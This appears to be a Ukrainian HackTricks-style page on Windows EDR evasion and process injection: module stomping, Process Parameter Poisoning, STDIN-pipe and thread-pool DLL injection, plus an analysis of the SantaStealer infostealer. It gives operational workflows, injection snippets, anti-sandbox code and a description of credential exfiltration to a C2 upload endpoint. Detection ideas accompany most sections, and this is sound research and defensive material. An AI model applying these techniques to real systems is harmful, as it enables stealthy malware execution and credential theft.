Module stomping виконує payloads із **секції `.text` DLL, уже відображеної в цільовому процесі**, замість виділення очевидної приватної executable memory або завантаження нової sacrificial DLL. Ціль для перезапису має бути **завантаженим disk-backed образом**, чий простір коду може вмістити payload, не пошкоджуючи шляхи виконання, потрібні процесу.<sup>[[1]](#references)[[2]](#references)</sup>

### Надійний вибір цілі

Наївний stomping поширених модулів, як-от `uxtheme.dll` або `comctl32.dll`, ненадійний: DLL може бути не завантажена у віддалений процес, а надто мала область коду призведе до аварійного завершення процесу. Надійніший workflow:

1. Перелічіть модулі цільового процесу й залиште **список включення лише з назвами** вже завантажених DLL.
2. Спершу побудуйте payload і зафіксуйте його **точний розмір у байтах**.
3. Проскануйте DLL-кандидати на диску та порівняйте **`.text` `Misc_VirtualSize`** PE section із розміром payload. Це важливіше за розмір файлу, оскільки відображає розмір executable section **у пам’яті після відображення**.
4. Розберіть **Export Address Table (EAT)** і виберіть RVA експортованої функції як початкове зміщення для stomp.
5. Обчисліть **радіус ураження**: якщо payload перевищує межу вибраної функції, він перезапише сусідні exports, розташовані після неї в пам’яті.

Типові helper-інструменти для розвідки/вибору цілей, які трапляються на практиці:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Надавайте перевагу DLL, які **вже завантажені** у віддалений процес, щоб уникнути телеметрії `LoadLibrary`/неочікуваного завантаження образів.
- Надавайте перевагу експортам, які цільова програма викликає рідко; інакше звичайні шляхи виконання можуть звернутися до затертих байтів до або після створення потоку.
- Для великих імплантів часто потрібно змінити спосіб вбудовування shellcode: замість рядкового літерала використовувати **масив байтів/ініціалізатор у фігурних дужках**, щоб у вихідному коді інжектора правильно представити весь буфер.

Detection ideas
- Віддалений запис у **виконувані сторінки, прив’язані до образу** (`MEM_IMAGE`, `PAGE_EXECUTE*`) замість поширеніших приватних виділень RWX/RX.
- Точки входу експортів, чиї байти в пам’яті більше не відповідають файлу-основі на диску.
- Віддалені потоки або перемикання контексту, що починають виконання всередині легітимного експорту DLL, перші байти якого нещодавно змінили.
- Підозрілі послідовності викликів `VirtualProtect(Ex)` / `WriteProcessMemory` для сторінок `.text` DLL із подальшим створенням потоку.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) — це техніка **ін’єкції в процес / обходу EDR**, яка уникає класичного шляху віддаленого запису (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання байтів у вже запущений цільовий процес вона використовує те, що Windows **копіює вибрані параметри запуску `CreateProcessW` у дочірній процес** і зберігає їх у `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Переносники даних, які можна отруїти й які копіює `CreateProcessW`

Корисні переносники:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (із `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження переносників:

- `lpCommandLine` має вказувати на **записувану пам’ять** для `CreateProcessW`; довжина обмежена **32 767 символами Unicode**, включно з нульовим термінатором.
- `lpEnvironment` має бути блоком середовища Unicode з послідовними рядками `NAME=VALUE\0`, завершеними додатковим `\0`.
- `lpReserved` офіційно зарезервований, тому відповідність `ShellInfo` слід вважати деталлю реалізації, а не стабільним задокументованим контрактом.

Так звичайне створення процесу стає **примітивом передавання payload**. Оператор створює дочірній процес із контрольованими зловмисником даними запуску, а Windows виконує копіювання між процесами.

### Потік пошуку у віддаленому процесі без API віддаленого запису

Після створення дочірнього процесу знайдіть скопійований буфер за допомогою **примітивів лише для читання**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримати `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитати віддалений `PEB`
3. Перейти за `PEB.ProcessParameters`
4. Прочитати `RTL_USER_PROCESS_PARAMETERS`
5. Використати вибраний вказівник:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Мінімальний потік:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не є виконуваною. Поширений ланцюжок P3:

1. Створити процес звичайним способом (не призупиненим)
2. Зробити вибрану сторінку параметрів виконуваною за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати дескриптор головного потоку, уже повернутий у `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних сценаріїв перехоплення потоку, для цього **не потрібні** `SuspendThread` / `ResumeThread`; контекст можна змінити безпосередньо через дескриптор повернутого головного потоку.

Це дозволяє уникнути кількох API, за якими часто стежать під час ін’єкції:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження нульового байта та staged shellcode

Усі три носії — це **рядкові або схожі на рядкові дані**, тому передавання сирого payload, що містить `0x00`, призводить до його обрізання. Практичний спосіб обійти це — **перший етап без нульових байтів**, який відновлює константи під час виконання, а потім завантажує довільний другий етап.

Проста схема — синтез констант на основі XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Це дає змогу першому етапу створювати рядки в стеку, аргументи API, шляхи до DLL або завантажувач shellcode другого етапу, не вбудовуючи нульові байти в параметр, що передається.

### Виклики API зі стеку на першому етапі

Коли перший етап має викликати API, наприклад `LoadLibraryA`, він може:

- помістити рядок/буфер у стек цільового процесу
- зарезервувати **32-байтовий x64 shadow space**
- встановити `RCX`, `RDX`, `R8`, `R9` у константи або вказівники відносно `RSP`
- перед викликом забезпечити **16-байтове вирівнювання** `RSP`

Після цього другий етап можна скопіювати зі стеку до області пам’яті з правами `PAGE_READWRITE`, змінити її права на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і передати їй керування, уникаючи прямого виділення пам’яті з правами RWX.

### Ідеї для виявлення

За словами авторів, варто звертати увагу на такі ознаки:

- `VirtualProtectEx` / `NtProtectVirtualMemory` надають сторінкам параметрів процесу права на виконання
- за цією зміною прав ідуть `SetThreadContext` / `NtSetContextThread`
- віддалене читання `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі значення або значення з високою ентропією в `lpCommandLine`, `lpEnvironment` чи `STARTUPINFO.lpReserved` під час створення процесу

### Примітки

- P3 — це **трюк для передавання даних між процесами**, а не повноцінний механізм виконання сам по собі: скопійованому параметру все ще потрібна зміна прав на виконання та метод перенаправлення виконання.
- Автори розглядали `RtlCreateProcessReflection` / Dirty Vanity, але відмовилися від цього варіанта, оскільки він усередині викликає підозрілі примітиви, як-от `NtWriteVirtualMemory` і `NtCreateThreadEx`.

## Ін’єкція через консольний STDIN pipe

Інтерактивний дочірній процес консолі також можна використовувати як **примітив для передавання payload**. Інжектор перенаправляє стандартний ввід дочірнього процесу на pipe і надсилає маркер, за яким іде shellcode. Коли консольна програма зчитує дані у власну приватну пам’ять, інжектор знаходить цей буфер, надає йому права на виконання та перенаправляє на нього дочірній потік. Це дає змогу уникнути `VirtualAllocEx` і `WriteProcessMemory`, але такий підхід усе одно є ін’єкцією процесу, а не універсальним обходом EDR.<sup>[[41]](#references)</sup>

Попри опис як «named-pipe», у референсній реалізації викликається `CreatePipe`, що створює **анонімний pipe**. Windows реалізує анонімні pipe за допомогою внутрішніх об’єктів pipe з унікальними іменами, але PoC ані не вибирає шлях `\\.\pipe\<name>`, ані не викликає `CreateNamedPipe`. Він створює дескриптори зі спадкуванням і дескриптором безпеки за замовчуванням, поміщає дескриптор читання у `STARTUPINFO.hStdInput`, встановлює `STARTF_USESTDHANDLES` і запускає новий дочірній процес зі спадкуванням дескрипторів. Отже, цей PoC запускає вказаний виконуваний файл консолі, а не під’єднує pipe до наявного процесу.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Робочий процес за референсною реалізацією

Реалізація використовує такий ланцюжок дій:<sup>[[41]](#references)</sup>

1. Створити пари анонімних pipe для `STDIN` і `STDOUT` дочірнього процесу. Вимкнути спадкування для двох дескрипторів батьківського процесу й закрити дублікати дескрипторів дочірнього процесу в батьківському процесі після створення процесу.
2. Запустити інтерактивний виконуваний файл, наприклад `netsh.exe` або `nslookup.exe`, із прапорцем `CREATE_NEW_CONSOLE`. Дочірній процес успадковує перенаправлені стандартні дескриптори.
3. Надіслати повний бінарний масив `rawData` через `WriteFile`, використовуючи дескриптор `STDIN` батьківського процесу. Консольна програма зчитує байти, залишаючи їхню копію в одній зі своїх приватних зафіксованих областей.
4. Переглянути адресний простір дочірнього процесу за допомогою `VirtualQueryEx`, прочитати ймовірні області `MEM_PRIVATE` через `ReadProcessMemory` і знайти маркер на початку `rawData`.
5. Змінити права знайденого буфера на `PAGE_EXECUTE_READWRITE` за допомогою `VirtualProtectEx`.
6. Знайти головний потік, призупинити його, встановити `RIP` у `found_address + 0x19` за допомогою `NtSetContextThread` і відновити його виконання.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Надана реалізація призначена лише для x64: вона змінює `CONTEXT.Rip`, а вбудований payload — це x64 shellcode. `rawData` починається з 25-байтового маркера, тому виконувані байти починаються за шістнадцятковим зміщенням `0x19`. Замінюючи payload, збережіть це розташування або узгоджено оновіть маркер, вектор пошуку, розмір масиву та зміщення виконання. У коментарях до вихідного коду також зазначено `0x0A`, `0x0D` і `0x1A` як недопустимі символи. Цей робочий процес не змінює токен чи привілеї дочірнього процесу.<sup>[[41]](#references)</sup>

Приклади шаблонів компіляції невеликих native-помічників і payload див. у [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Ін’єкція DLL через callback пулу потоків без shellcode (DLLParty)

DLLParty адаптує ін’єкцію пулу потоків у стилі PoolParty, щоб наявний worker цільового процесу викликав `LoadLibraryA`, а не виконував ін’єктований callback stub. Примітивом диспетчеризації є `TP_DIRECT`, поставлений у чергу completion-порту вводу-виводу цільового пулу. Це не обходить дозволи процесу: PoC викликає `OpenProcess(PROCESS_ALL_ACCESS)` і потребує читання та запису в пам’ять цільового процесу, а також можливості дублювати handles worker-factory і completion-port.<sup>[[46]](#references)[[47]](#references)</sup>

У Windows x64 worker передає в `RCX`, першому аргументі callback, вказівник на `TP_CALLBACK_INSTANCE`, розміщений у стеку. `LoadLibraryA` інтерпретує цей самий вказівник як `LPCSTR`. На протестованому шляху `TppWorkerThread` формує вказівник за адресою `RSP+0x178`, тоді як перший звичайний запис у цей об’єкт відбувається за адресою `RSP+0x1d0`. Тому шлях до DLL із завершальним нульовим символом, який уміщується в цей префікс розміром 0x58 байта, може займати початок об’єкта, не будучи перезаписаним до диспетчеризації. Це спостереження стосується конкретної збірки, а не є документованою гарантією ABI Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Еталонний робочий процес:<sup>[[46]](#references)[[47]](#references)</sup>

1. Перелічіть handles цільового процесу за допомогою `NtQuerySystemInformation(SystemHandleInformation)` і визначте `TpWorkerFactory`, запитуючи типи об’єктів. Дублюйте handle worker-factory і запитайте `WorkerFactoryBasicInformation`; поле `StartParameter` містить адресу віддаленого `TP_POOL`. Пропускайте фабрики, у яких `TotalWorkerCount == 0`.
2. Прочитайте `TP_POOL.CompletionPort` і пройдіть приватним списком worker-ів пулу. У протестованій збірці Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`) його головний елемент розташовано за адресою `pool+0x60`; кожне посилання — за адресою `worker+0x10`, тому слот callback-інстансу за адресою `worker+0x38` відповідає `link+0x28`. PoC перевіряє вирівнювання вказівників, взаємність посилань, належність до пулу, ненульові ідентифікатори потоків, повторювані вузли та стабільність головного елемента списку.
3. Запишіть шлях до DLL у **кожен** відновлений слот worker-а, оскільки completion із черги може забрати будь-який worker. Розмістіть `TP_DIRECT` із `Callback = LoadLibraryA` у доступній для запису пам’яті цільового процесу. Замість `VirtualAllocEx` PoC використовує адресу `last_slot-0x500` у стеку worker-а; це експериментальне зміщення, яке не повинно перетинатися з активними даними стека.
4. Дублюйте handle completion-порту цільового процесу й викличте `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Адреса віддаленого `TP_DIRECT` є ключем completion. Наявний worker викличе `LoadLibraryA` з перезаписаним вказівником на callback-інстанс і завантажить DLL, до якої цільовий процес уже має доступ.

PoC приймає PID цільового процесу (`DLLParty.exe <target_pid>`) і використовує жорстко заданий шлях до DLL у `DLLParty.cpp`; перед створенням виконуваного файла x64 укажіть шлях, доступний цільовому процесу. Також він використовує адресу `LoadLibraryA` зі свого процесу як віддалений callback, тобто припускає, що ця адреса дійсна в цільовому процесі. Код не перевіряє довжину шляху на відповідність префіксу розміром 0x58 байта й не перевіряє, чи знайшов обхід worker-ів слот, перш ніж індексувати останній елемент. Повторно перевірте приватні зміщення, розкладку стека та доступний для запису простір для цільової збірки. Відмова від `CreateRemoteThreadEx`, shellcode і `VirtualAllocEx` не усуває записів між процесами чи телеметрії завантаження DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Тактики SantaStealer для безфайлового ухилення та викрадення облікових даних

SantaStealer (також відомий як BluelineStealer) показує, як сучасні інфостілери поєднують в одному робочому процесі обхід AV, протидію аналізу та доступ до облікових даних.<sup>[[24]](#references)</sup>

### Перевірка розкладки клавіатури та затримка в sandbox

- Прапорець конфігурації (`anti_cis`) перелічує встановлені розкладки клавіатури за допомогою `GetKeyboardLayoutList`. Якщо знайдено кириличну розкладку, зразок створює порожній маркер `CIS` і завершує роботу до запуску stealer-ів, гарантуючи, що він не спрацює в локалях, які виключено, але залишить артефакт для пошуку.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Багаторівнева логіка `check_antivm`

- Варіант A проходить список процесів, хешує кожне ім’я за допомогою спеціальної ковзної контрольної суми та порівнює її з вбудованими списками блокування для debugger-ів/sandbox-ів; він повторно обчислює контрольну суму для імені комп’ютера та перевіряє робочі каталоги, як-от `C:\analysis`.
- Варіант B перевіряє властивості системи (мінімальну кількість процесів, нещодавній час безперервної роботи), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і вимірює час до та після sleep-викликів, щоб виявити покрокове виконання. За будь-якого збігу виконання переривається до запуску модулів.

### Fileless helper + подвійне reflective loading через ChaCha20

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або вручну відображається в пам’яті; у fileless-режимі він самостійно розв’язує imports/relocations, тож жодних артефактів helper не записується.
- Цей helper зберігає DLL другого етапу, двічі зашифровану ChaCha20 (два 32-байтові ключі та 12-байтові nonce). Після обох етапів він завантажує blob за допомогою reflective loading (без `LoadLibrary`) і викликає exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, отримані з [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Процедури ChromElevator використовують reflective process hollowing із direct syscalls для ін’єкції в запущений браузер Chromium, успадковують ключі AppBound Encryption і розшифровують паролі/cookies/дані кредитних карток безпосередньо з баз даних SQLite, попри посилений захист ABE.

### Модульний збір у пам’яті та chunked HTTP exfil

- `create_memory_based_log` перебирає глобальну таблицю покажчиків на функції `memory_generators` і запускає по одному потоку для кожного ввімкненого модуля (Telegram, Discord, Steam, знімки екрана, документи, розширення браузера тощо). Кожен потік записує результати у спільні буфери та повідомляє кількість файлів після очікування потоків протягом приблизно 45 с.
- Після завершення все архівується статично скомпонованою бібліотекою `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` чекає 15 с і надсилає архів потоково, частинами по 10 МБ, через HTTP POST на `http://<C2>:6767/upload`, підробляючи browser boundary `multipart/form-data` (`----WebKitFormBoundary***`). Кожна частина містить `User-Agent: upload`, `auth: <build_id>`, необов’язковий `w: <campaign_tag>`, а до останньої додається `complete: true`, щоб C2 знав про завершення повторного збирання.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML-based .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)

{{#include ../banners/hacktricks-training.md}}
